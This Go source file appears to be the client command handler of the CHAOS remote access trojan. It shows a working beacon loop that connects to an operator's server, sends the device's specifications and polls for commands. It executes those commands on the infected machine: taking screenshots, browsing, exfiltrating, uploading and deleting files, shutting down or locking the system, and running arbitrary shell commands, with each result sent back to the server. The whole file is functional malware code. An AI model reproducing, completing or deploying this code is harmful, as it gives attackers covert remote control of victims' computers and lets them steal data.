package handler

import (
	"encoding/json"
	"fmt"
	"github.com/tiagorlampert/CHAOS/client/app/entities"
	"github.com/tiagorlampert/CHAOS/client/app/gateway"
	"github.com/tiagorlampert/CHAOS/client/app/services"
	"github.com/tiagorlampert/CHAOS/client/app/shared/environment"
	"github.com/tiagorlampert/CHAOS/client/app/utilities/encode"
	"log"
	"net/http"
	"strings"
	"time"
)

type Handler struct {
	Configuration *environment.Configuration
	Gateway       gateway.Gateway
	Services      *services.Services
	MacAddress    string
	Connected     bool
	DoingRequest  bool
	CommandUrl    string
}

func NewHandler(
	configuration *environment.Configuration,
	gateway gateway.Gateway,
	services *services.Services,
	macAddress string,
) *Handler {
	return &Handler{
		Configuration: configuration,
		Gateway:       gateway,
		Services:      services,
		MacAddress:    macAddress,
		CommandUrl:    fmt.Sprint(configuration.Server.URL, configuration.Server.Command),
	}
}

func (h *Handler) HandleServer() {
	sleepTime := 5 * time.Second
	for {
		if h.Connected {
			time.Sleep(10 * time.Second)
			continue
		}
		if err := h.ServerIsAvailable(); err != nil {
			h.Log("[!] Error connecting with server: " + err.Error())
			h.Connected = false
			time.Sleep(sleepTime)
			continue
		}

		if err := h.SendDeviceSpecs(); err != nil {
			h.Log("[!] Error connecting with server: " + err.Error())
			h.Connected = false
			time.Sleep(sleepTime)
			continue
		}
		h.Log("[*] Successfully connected")
		h.Connected = true
	}
}

func (h *Handler) Log(v string) {
	fmt.Printf(" %s\n", v)
}

func (h *Handler) ServerIsAvailable() error {
	res, err := h.Gateway.NewRequest(http.MethodGet,
		fmt.Sprint(h.Configuration.Server.URL, h.Configuration.Server.Health), nil)
	if err != nil {
		return err
	}
	if res.StatusCode != http.StatusOK {
		return fmt.Errorf("error with status code: %d (%s)", res.StatusCode, string(res.ResponseBody))
	}
	return nil
}

func (h *Handler) SendDeviceSpecs() error {
	deviceSpecs, err := h.Services.Information.LoadDeviceSpecs()
	if err != nil {
		return err
	}
	body, err := json.Marshal(deviceSpecs)
	if err != nil {
		return err
	}
	res, err := h.Gateway.NewRequest(http.MethodPost,
		fmt.Sprint(h.Configuration.Server.URL, h.Configuration.Server.Device), body)
	if err != nil {
		return err
	}
	if res.StatusCode != http.StatusOK {
		return fmt.Errorf("error with status code %d", res.StatusCode)
	}
	return nil
}

func (h *Handler) ReceiveCommand() (entities.Payload, error) {
	url := fmt.Sprint(h.CommandUrl, "?address=", encode.Base64Encode(h.MacAddress))
	res, err := h.Gateway.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return entities.Payload{}, err
	}
	if res.StatusCode == http.StatusNoContent {
		return entities.Payload{}, err
	}
	var payload entities.Payload
	if err := json.Unmarshal(res.ResponseBody, &payload); err != nil {
		return entities.Payload{}, err
	}
	return payload, err
}

func (h *Handler) HandleCommand() {
	for {
		time.Sleep(2 * time.Second)
		if h.DoingRequest || !h.Connected {
			continue
		}

		func() {
			defer func() { h.DoingRequest = false }()
			h.DoingRequest = true

			requestCommand, err := h.ReceiveCommand()
			if err != nil {
				h.Connected = false
				return
			}
			if len(strings.TrimSpace(requestCommand.Request)) == 0 {
				return
			}

			var response []byte
			var hasErr bool

			commandParts := strings.Split(requestCommand.Request, " ")
			switch strings.ToLower(strings.TrimSpace(commandParts[0])) {
			case "getos":
				deviceSpecs, err := h.Services.Information.LoadDeviceSpecs()
				if err != nil {
					hasErr = true
					response = encode.StringToByte(err.Error())
					break
				}
				response = encode.StringToByte(encode.PrettyJson(deviceSpecs))
				break
			case "screenshot":
				screenshot, err := h.Services.Screenshot.TakeScreenshot()
				if err != nil {
					hasErr = true
					response = encode.StringToByte(err.Error())
					break
				}
				response = screenshot
				break
			case "restart":
				if err := h.Services.OS.Restart(); err != nil {
					hasErr = true
					response = encode.StringToByte(err.Error())
				}
				break
			case "shutdown":
				if err := h.Services.OS.Shutdown(); err != nil {
					hasErr = true
					response = encode.StringToByte(err.Error())
				}
				break
			case "lock":
				if err := h.Services.OS.Lock(); err != nil {
					hasErr = true
					response = encode.StringToByte(err.Error())
				}
				break
			case "sign-out":
				if err := h.Services.OS.SignOut(); err != nil {
					hasErr = true
					response = encode.StringToByte(err.Error())
				}
				break
			case "explore":
				fileExplorer, err := h.Services.Explorer.ExploreDirectory(commandParts[1])
				if err != nil {
					response = encode.StringToByte(err.Error())
					hasErr = true
					break
				}
				explorerBytes, _ := json.Marshal(fileExplorer)
				response = explorerBytes
				break
			case "download":
				filepath := strings.TrimSpace(strings.ReplaceAll(requestCommand.Request, "download", ""))
				res, err := h.Services.Upload.UploadFile(filepath)
				if err != nil {
					response = encode.StringToByte(err.Error())
					hasErr = true
					break
				}
				response = res
				break
			case "delete":
				filepath := strings.TrimSpace(strings.ReplaceAll(requestCommand.Request, "delete", ""))
				err := h.Services.Delete.DeleteFile(filepath)
				if err != nil {
					response = encode.StringToByte(err.Error())
					hasErr = true
					break
				}
				break
			case "upload":
				filepath := strings.TrimSpace(strings.ReplaceAll(requestCommand.Request, "upload", ""))
				res, err := h.Services.Download.DownloadFile(filepath)
				if err != nil {
					response = encode.StringToByte(err.Error())
					hasErr = true
					break
				}
				response = res
				break
			case "open-url":
				err := h.Services.URL.OpenURL(commandParts[1])
				if err != nil {
					response = encode.StringToByte(err.Error())
					hasErr = true
					break
				}
				break
			default:
				response = encode.StringToByte(
					h.Services.Terminal.Run(requestCommand.Request, h.Configuration.Connection.ContextDeadline))
			}

			body, err := json.Marshal(entities.Payload{
				MacAddress: h.MacAddress,
				Response:   response,
				HasError:   hasErr,
			})
			if err != nil {
				return
			}

			responseCommand, err := h.Gateway.NewRequest(http.MethodPut, h.CommandUrl, body)
			if err != nil || responseCommand.StatusCode != http.StatusOK {
				log.Println(err)
			}
		}()
	}
}
